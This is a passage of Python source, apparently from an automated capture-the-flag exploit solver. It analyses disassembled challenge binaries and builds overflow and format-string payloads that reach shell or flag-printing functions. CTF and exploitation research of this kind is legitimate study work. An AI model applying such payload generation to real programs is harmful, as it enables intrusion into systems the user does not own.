            s = read_cstr(ch, e[1])
            if s and s.strip():
                best = s.strip()
    return best


def _fmt_site(f, buf) -> int:
    """printf(用户缓冲) 的调用点：只用 facts 解析出的站点（C4，不重复解析）。"""
    if not buf or buf[0] != "stack":
        return 0
    for base, disp, _val, call in getattr(f, "fmt_sites", []) or []:
        if base == buf[2] and disp == buf[1]:
            return int(call)
    return 0


def find_guards(ch: Challenge, d: Dis, f) -> list[Guard]:
    """为每个「同函数 sink 之后的 win 调用」产出守卫分析结果。"""
    entries = _func_entries(ch, d)
    eidx = _entry_index(d, entries)
    out: list[Guard] = []
    for n, ins in enumerate(d.insns):
        if ins.mnemonic != "call" or not ins.operands:
            continue
        op = ins.operands[0]
        if op.type != X86_OP_IMM:
            continue
        name = (getattr(ch, "plt_map", {}) or {}).get(int(op.imm))
        if name not in _WIN_FUNCS:
            continue
        entry = _entry_of(ins.address, entries)
        if entry not in eidx:
            continue
        lo_i, hi_i = eidx[entry]
        v = _nearest_sink(f, entry, n, d)
        if v is None:
            continue
        text, _addr = _arg_text(ch, d, n, lo_i)
        kind = _classify(text)
        if kind not in ("shell", "flag"):
            continue
        sink_i = d.by_addr.get(v.call_addr)
        buf = _sink_buf(ch, d, sink_i, v.sink, lo_i)
        if buf is None and v.buf_disp is not None:
            buf = ("stack", v.buf_disp, "rbp")
        if buf is None:
            continue
        if buf[0] == "global" and not _looks_writable(ch, buf[1]):
            continue
        conds, ones, length, status, reason = _collect_conditions(
            ch, d, eidx, lo_i, hi_i, ins.address, lo_i, buf, 0, min_j=sink_i)
        if status == "solved" and not conds and not ones and length is None:
            continue                                  # 路径上没有条件：不是守卫题
        g = Guard(call=int(ins.address), entry=entry, kind=kind, arg=text or "",
                  sink=v.sink, sink_call=int(v.call_addr), buf_kind=buf[0],
                  buf_addr=buf[1] if buf[0] == "global" else 0,
                  buf_disp=buf[1] if buf[0] == "stack" else None,
                  length=length, conds=conds, ones=ones,
                  read_count=_read_count(ch, d, sink_i, v.sink, lo_i),
                  marker=_path_marker(ch, d, lo_i, hi_i, sink_i, n),
                  status=status, reason=reason, offset=v.offset)
        if status != "solved":
            out.append(g)
            continue
        if any(c.kind == "global" for c in conds):
            if ch.elf.pie:
                g.status, g.reason = "unsupported", "PIE 全局门：无运行时地址（留待 v7.4.1）"
                out.append(g)
                continue
            g.fmt_call = _fmt_site(f, buf)
            if not g.fmt_call:
                g.status, g.reason = "unsupported", "找不到 printf(buf) 站点，无法写全局"
                out.append(g)
                continue
            g.status = "fmt"
        out.append(g)
    return out


# --------------------------------------------------------------------------- 载荷构造
def _bad_bytes(sink: str) -> bytes:
    if sink in _SCANF_SINKS or sink in ("gets", "fgets"):
        return b" \t\n\x0b\x0c\r\x00"
    return b"\x00"


def _bss_covers(ch: Challenge, addr: int, n: int) -> bool:
    for sec in ch.elf.sections:
        if sec.name != ".bss":
            continue
        base = int(sec.header.sh_addr)
        size = int(sec.header.sh_size)
        if base <= addr and addr + n <= base + size:
            return True
    return False


def _zero_backed(ch: Challenge, g: Guard, off: int, n: int) -> bool:
    """载荷外的零值字段是否由 .bss 保证（4ee0 的 var+0x38）。"""
    if g.buf_kind != "global":
        return False
    return _bss_covers(ch, g.buf_addr + off, n)


def _seg_nonzero(buf: bytearray, e) -> bool:
    for leaf in _leaves(e):
        if leaf[0] == "b8":
            seg = bytes(buf[leaf[1]:leaf[1] + 1])
        elif leaf[0] == "b32":
            seg = bytes(buf[leaf[1]:leaf[1] + 4])
        else:
            continue
        if seg and any(seg):
            return True
    return False


def _ones_ok(buf: bytearray, item) -> bool:
    if item[0] == "any":
        return any(_seg_nonzero(buf, e) for e in item[1])
    _, off, size, val = item
    seg = bytes(buf[off:off + size])
    if not seg:
        return False
    return int.from_bytes(seg, "little") != (val & ((1 << (8 * len(seg))) - 1))


def _ones_fill(buf: bytearray, item, conds) -> bool:
    """自动满足非零约束：挑一个未被等式约束占用的缓冲字节写 0x42。"""
    taken = {c.off for c in conds if c.kind in ("byte", "dword")}
    cands = []
    if item[0] == "any":
        for e in item[1]:
            cands += [x for x in _leaves(e) if x[0] in ("b8", "b32")]
    else:
        cands.append(("b8", item[1]))
    for leaf in cands:
        off = leaf[1]
        if off >= len(buf) or off in taken:
            continue
        buf[off] = 0x42
        return True
    return False


def build_guard_payload(ch: Challenge, g: Guard) -> Optional[bytes]:
    """按约束构造缓冲内容；失败返回 None 并把原因写进 g.status/g.reason。

    关键：`%s` 读不进来 NUL，所以非零 dword 只写到最后一个非零字节为止
    （0x00000011 只写 \\x11）；全零字段必须整体落在载荷之外、且有 .bss 兜底。
    """
    if g.status != "solved":
        return None
    size_of = {"byte": 1, "dword": 4}
    nz = [c for c in g.conds if c.kind in size_of and c.val != 0]

    def eff(c) -> int:
        return _last_nonzero((c.val & 0xFFFFFFFF).to_bytes(4, "little")[:c.size]) + 1

    if g.length is not None:
        length = int(g.length)
    else:
        length = max((c.off + eff(c) for c in nz), default=0)
    if length <= 0 or length > 0x4000:
        g.status, g.reason = "unsat", f"载荷长度不合法：{length}"
        return None
    if g.buf_kind == "stack" and g.offset and length >= g.offset:
        g.status, g.reason = "unsat", f"栈缓冲长度 {length} 触达 canary/返回地址（{g.offset}）"
        return None

    buf = bytearray(b"A" * length)
    bad = _bad_bytes(g.sink)
    for c in g.conds:
        if c.kind == "len":
            continue
        n = size_of.get(c.kind)
        if n is None:
            g.status, g.reason = "unsat", f"未知约束形态 {c.kind}"
            return None
        raw = (c.val & 0xFFFFFFFF).to_bytes(4, "little")[:n]
        k = _last_nonzero(raw)
        if k < 0:
            if c.off >= length and _zero_backed(ch, g, c.off, n):
                continue                     # 载荷外 + .bss 保证为 0
            g.status, g.reason = "unsat", \
                f"[{c.off:#x}] 需要零值，{g.sink} 载荷无法携带 NUL"
            return None
        raw = raw[:k + 1]
        if c.off + len(raw) > length:
            g.status, g.reason = "unsat", f"[{c.off:#x}] 非零字节超出长度 {length}"
            return None
        if any(x in bad for x in raw):
            g.status, g.reason = "unsat", f"[{c.off:#x}] 载荷含 {g.sink} 禁止的字节"
            return None
        buf[c.off:c.off + len(raw)] = raw

    for item in g.ones:
        if _ones_ok(buf, item):
            continue
        if not _ones_fill(buf, item, g.conds):
            g.status, g.reason = "unsat", "非零条件无法用输入满足"
            return None
    return bytes(buf)


def fmt_payload(ch: Challenge, g: Guard, fmt_idx: int,
                write_size: str = "byte") -> Optional[bytes]:
    """把全局约束写成 fmtstr_payload；拒绝含 \\n 或超出 read 容量的 blob。"""
    from pwn import context, fmtstr_payload
    writes = {}
    for c in g.conds:
        if c.kind != "global":
            continue
        writes[int(c.off)] = int(c.val) & (0xFF if c.size == 1 else 0xFFFFFFFF)
    if not writes:
        return None
    try:
        with context.local(bits=ch.elf.bits, endian="little"):
            blob = fmtstr_payload(fmt_idx, writes, write_size=write_size)
    except Exception:
        return None
    if not blob or b"\n" in blob:
        return None
    if g.read_count and len(blob) + 1 > g.read_count:
        return None
    return blob


# --------------------------------------------------------------------------- 回填
_SUCCESS_WORDS = ("good", "congrat", "success", "right", "correct", "win", "pass", "yes")
_FAIL_WORDS = ("fail", "wrong", "bad", "error", "nope", "denied", "incorrect")


def _is_success(text: str) -> bool:
    low = (text or "").lower()
    if any(w in low for w in _FAIL_WORDS):
        return False
    return any(w in low for w in _SUCCESS_WORDS)


def _edge_text(ch: Challenge, d: Dis, lo_i: int, hi_i: int, start_i: int) -> str:
    for k in range(start_i, min(start_i + 10, hi_i)):
        ins = d.insns[k]
        if ins.mnemonic in ("ret", "jmp"):
            break
        if ins.mnemonic != "call" or not ins.operands or ins.operands[0].type != X86_OP_IMM:
            continue
        nm = (getattr(ch, "plt_map", {}) or {}).get(int(ins.operands[0].imm))
        if nm not in ("puts", "printf"):
            continue
        e = _args(ch, d, k, lo_i, 1)[0]
        if e and e[0] in ("abs", "base"):
            s = read_cstr(ch, e[1])
            if s:
                return s
    return ""


def _cmp_marker(ch: Challenge, d: Dis, lo_i: int, hi_i: int, call_i: int):
    """strncmp 之后的分支：哪条边是成功、打印了什么。"""
    j = None
    for k in range(call_i + 1, min(call_i + 5, hi_i)):
        ins = d.insns[k]
        if ins.mnemonic in ("test", "cmp"):
            continue
        if ins.mnemonic in _JCC:
            j = k
        break
    if j is None:
        return "unknown", b"", "strncmp 之后没有可识别的分支"
    ti = d.by_addr.get(_jmp_target(d.insns[j]))
    if ti is None or not (lo_i <= ti < hi_i):
        return "unknown", b"", "分支目标不在函数内"
    taken = _edge_text(ch, d, lo_i, hi_i, ti)
    fall = _edge_text(ch, d, lo_i, hi_i, j + 1)
    tok, tof = _is_success(taken), _is_success(fall)
    if tok and not tof:
        return "backfill", taken.encode("latin-1", "replace"), ""
    if tof and not tok:
        return "backfill", fall.encode("latin-1", "replace"), ""
    return "unknown", b"", f"两条分支无法区分成功/失败（{taken!r} / {fall!r}）"


def _caller_prints(ch: Challenge, d: Dis, eidx: dict, entry: int) -> bool:
    """调用者是否把同一个缓冲用 printf/puts 打出来过（回填的前提）。"""
    pmap = getattr(ch, "plt_map", {}) or {}
    if entry not in eidx:
        return False
    clo0, chi0 = eidx[entry]
    for n, ins in enumerate(d.insns):
        if ins.mnemonic != "call" or not ins.operands or ins.operands[0].type != X86_OP_IMM:
            continue
        if int(ins.operands[0].imm) != entry:
            continue
        caller = _entry_of(ins.address, list(eidx))
        if caller not in eidx:
            return False
        clo, _chi = eidx[caller]
        passed = _args(ch, d, n, clo, 1)[0]
        if not passed or passed[0] == "abs":
            return False
        for k in range(n - 1, max(clo - 1, n - 40), -1):
            p = d.insns[k]
            if p.mnemonic != "call" or not p.operands or p.operands[0].type != X86_OP_IMM:
                continue
            if pmap.get(int(p.operands[0].imm)) not in ("printf", "puts"):
                continue
            if any(a and a == passed for a in _args(ch, d, k, clo, 3)):
                return True
        return False
    return False


def _same_buf(a, b) -> bool:
    """两个实参表达式是否指向同一个缓冲（同基址 + 同位移）。"""
    if not a or not b or a[0] != b[0]:
        return False
    if a[0] == "stack":
        return a[1] == b[1] and a[2] == b[2]
    return a[1] == b[1]


def find_backfills(ch: Challenge, d: Dis, f) -> list[Backfill]:
    """strncmp(input, 运行时串, n) → 回填前 n 字节（434c）。"""
    cmp_addrs = {a for a, nm in (getattr(ch, "plt_map", {}) or {}).items() if nm == "strncmp"}
    if not cmp_addrs:
        return []
    entries = _func_entries(ch, d)
    eidx = _entry_index(d, entries)
    out: list[Backfill] = []
    for n, ins in enumerate(d.insns):
        if ins.mnemonic != "call" or not ins.operands or ins.operands[0].type != X86_OP_IMM:
            continue
        if int(ins.operands[0].imm) not in cmp_addrs:
            continue
        entry = _entry_of(ins.address, entries)
        if entry not in eidx:
            continue
        lo_i, hi_i = eidx[entry]
        v = _nearest_sink(f, entry, n, d)
        if v is None:
            continue
        sink_i = d.by_addr.get(v.call_addr)
        buf = _sink_buf(ch, d, sink_i, v.sink, lo_i)
        if buf is None and v.buf_disp is not None:
            buf = ("stack", v.buf_disp, "rbp")
        if buf is None:
            continue
        args = _args(ch, d, n, lo_i, 3)
        idx_buf = next((i for i, e in enumerate(args)
                        if e and i < 2 and _same_buf(e, buf)), None)
        if idx_buf is None:
            continue
        n_val, other = None, None
        for i, e in enumerate(args):
            if i == idx_buf:
                continue
            if i == 2 and e and e[0] == "abs" and 0 < e[1] <= 0x1000:
                n_val = int(e[1])
            else:
                other = e
        if n_val is None:
            continue
        if other is None:
            out.append(Backfill(call=int(ins.address), entry=entry, n=n_val,
                                status="unknown", reason="对照实参不可解析"))
            continue
        if other[0] in ("abs", "base"):
            out.append(Backfill(call=int(ins.address), entry=entry, n=n_val,
                                status="unsupported", reason="strncmp 对照串是常量，输入不可控"))
            continue
        status, marker, reason = _cmp_marker(ch, d, lo_i, hi_i, n)
        if status != "backfill":
            out.append(Backfill(call=int(ins.address), entry=entry, n=n_val,
                                status=status, reason=reason))
            continue
        if not _caller_prints(ch, d, eidx, entry):
            out.append(Backfill(call=int(ins.address), entry=entry, n=n_val, marker=marker,
                                status="unprinted", reason="调用者没有把缓冲打印出来"))
            continue
        out.append(Backfill(call=int(ins.address), entry=entry, n=n_val, marker=marker))
    return out
